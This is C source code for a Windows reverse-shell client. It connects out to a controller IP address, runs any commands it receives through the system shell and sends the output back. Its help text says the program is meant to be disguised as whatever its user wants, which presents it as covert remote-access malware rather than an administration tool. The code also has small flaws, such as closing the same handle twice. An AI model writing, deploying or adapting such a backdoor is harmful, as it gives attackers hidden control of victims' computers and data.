#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <Ws2tcpip.h> // Add this for inet_pton 

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#define PORT 12345
#define SERVER_PORT 12345
#define MAX_BUFFER_SIZE 65536

int main(int argc, char* argv[]) {
    if (argc != 2) {
        printf("Arg1: Controller IP\nThis is a remote connection program. Connections are on port 12345. This is to be disguised as whatever you want. Always start the controller program first.");
    }
    WSADATA wsaData;
    SOCKET serverSocket;
    struct sockaddr_in serverAddr;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        perror("Error");
        return 1;
    }

    // Create server socket
    serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == INVALID_SOCKET) {
        perror("Error");
        WSACleanup();
        return 1;
    }

    // Configure server address (laptop's IP and port)
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);

    // Convert laptop's IP address from string to binary
    if (inet_pton(AF_INET, argv[1], &serverAddr.sin_addr) <= 0) {
        perror("Error");
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    // Connect to the laptop
    if (connect(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        perror("Error");
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    printf("RCS is running");

    char command[MAX_BUFFER_SIZE];
    char response[MAX_BUFFER_SIZE];

    while (1) {
        // Receive command from the laptop
        memset(command, 0, sizeof(command));
        int bytesReceived = recv(serverSocket, command, sizeof(command), 0);

        if (bytesReceived == SOCKET_ERROR || bytesReceived == 0) {
            //printf("Connection closed\n");
            break;
        }

        // Execute command (insecure, use with caution)
        //send(serverSocket, command, strlen(command), 0);
        //send(serverSocket, "\n", 1, 0);
        FILE* fp = _popen(command, "r");
        memset(response, 0, sizeof(response));

        if (fp != NULL) {
            fread(response, 1, sizeof(response) - 1, fp);
            fclose(fp);
        }

        // Send the output of the command back to the laptop
        send(serverSocket, response, strlen(response), 0);
        if (strlen(response) == 0) {
            send(serverSocket, command, strlen(command), 0);
        }
        _pclose(fp);
    }

    // Clean up and close socket
    closesocket(serverSocket);
    WSACleanup();

    return 0;
}
